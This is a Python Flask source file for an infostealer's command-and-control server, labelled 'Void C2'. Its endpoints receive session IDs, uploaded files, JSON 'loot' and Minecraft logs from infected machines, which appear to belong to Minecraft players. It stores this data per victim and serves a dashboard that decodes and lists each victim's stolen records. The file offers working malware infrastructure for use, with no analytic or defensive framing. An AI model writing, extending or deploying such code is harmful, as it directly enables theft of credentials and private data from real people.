"""Void C2 server - receives stealer check-ins and loot. Run on your VPS."""
import os, json, datetime
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)
LOOT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
os.makedirs(LOOT, exist_ok=True)

def log(msg):
    print(f"[{datetime.datetime.now().isoformat(timespec='seconds')}] {msg}", flush=True)

@app.route("/shard/prefireMc", methods=["POST"])
def prefire():
    data = request.get_json(force=True, silent=True) or {}
    prefire_id = os.urandom(8).hex()
    log(f"prefire from {request.remote_addr} user={data.get('userId')} session={str(data.get('sessionId'))[:16]}... -> {prefire_id}")
    return jsonify({"prefireId": prefire_id})

@app.route("/shard", methods=["GET", "POST"])
def shard():
    if request.method == "GET":
        return jsonify({"status": "ok"})
    data = request.get_json(force=True, silent=True) or {}
    uid = data.get("userId", "unknown")
    log(f"shard_post from {uid} keys={list(data.keys())}")
    with open(os.path.join(LOOT, f"shard_{uid}.json"), "a") as f:
        f.write(json.dumps({"ts": datetime.datetime.now().isoformat(), "ip": request.remote_addr, "data": data}) + "\n")
    return jsonify({"status": "ok"})

@app.route("/submit", methods=["POST"])
def submit():
    uid = request.form.get("userId", "unknown")
    for key, f in request.files.items():
        path = os.path.join(LOOT, f"{uid}_{key}_{f.filename}")
        f.save(path)
        log(f"loot {path} ({os.path.getsize(path)} bytes)")
    # also accept raw json loot
    if request.is_json:
        data = request.get_json(silent=True) or {}
        with open(os.path.join(LOOT, f"loot_{uid}.json"), "a") as fh:
            fh.write(json.dumps(data) + "\n")
        log(f"json loot from {uid}: {list(data.keys())}")
    return jsonify({"status": "ok"})

@app.route("/shard/submitMinecraftLog", methods=["POST"])
def mc_log():
    data = request.get_json(force=True, silent=True) or {}
    uid = data.get("userId", "unknown")
    with open(os.path.join(LOOT, f"mc_{uid}.log"), "a", encoding="utf-8", errors="replace") as f:
        f.write(f"\n===== {datetime.datetime.now().isoformat()} {request.remote_addr} =====\n")
        f.write(data.get("content", "")[:1_000_000])
    log(f"minecraft log from {uid} ({len(data.get('content',''))} bytes)")
    return jsonify({"status": "ok"})

@app.route("/loot/<path:name>", methods=["GET"])
def get_loot(name):
    return send_from_directory(LOOT, name)

DASH = """<!doctype html><html><head><meta charset=utf-8><title>Void C2</title>
<style>body%%BG%%</style></head><body>
<h1>&#128293; VOID C2</h1><p>__N__ victims</p>
<table><tr><th>victim</th><th>last seen</th><th>categories</th><th>records</th><th>loot</th></tr>__ROWS__</table>
</body></html>""".replace("%%BG%%", "{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px}"
"h1{color:#f85149}table{border-collapse:collapse;width:100%}"
"td,th{border:1px solid #30363d;padding:6px 10px;text-align:left}"
"th{background:#161b22}a{color:#58a6ff}")

@app.route("/", methods=["GET"])
@app.route("/dashboard", methods=["GET"])
def dashboard():
    import glob as _g, zlib as _z, base64 as _b
    rows = ""
    for fp in sorted(_g.glob(os.path.join(LOOT, "shard_*.json"))):
        uid = os.path.basename(fp)[6:-5]
        if uid in ("vps-test", "unknown"):
            continue
        try:
            lines = open(fp).readlines()
            last = json.loads(lines[-1])
            loot = json.loads(_z.decompress(_b.b64decode(last["data"]["loot_b64"])))
            cats = ", ".join(sorted(loot.keys()))
            total = sum(len(v) for v in loot.values())
            rows += f"<tr><td>{uid}</td><td>{last.get('ts','')}</td><td>{cats}</td><td>{total}</td>" \
                    f"<td><a href='/loot/shard_{uid}.json'>raw</a></td></tr>"
        except Exception as e:
            rows += f"<tr><td>{uid}</td><td colspan=4>parse error</td></tr>"
    return DASH.replace("__N__", str(len(rows.split("<tr>")) - 1)).replace("__ROWS__", rows or "<tr><td colspan=5>no victims yet</td></tr>")

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=443)
    a = ap.parse_args()
    print(f"Void C2 listening on 0.0.0.0:{a.port}, loot -> ./loot")
    app.run(host="0.0.0.0", port=a.port)
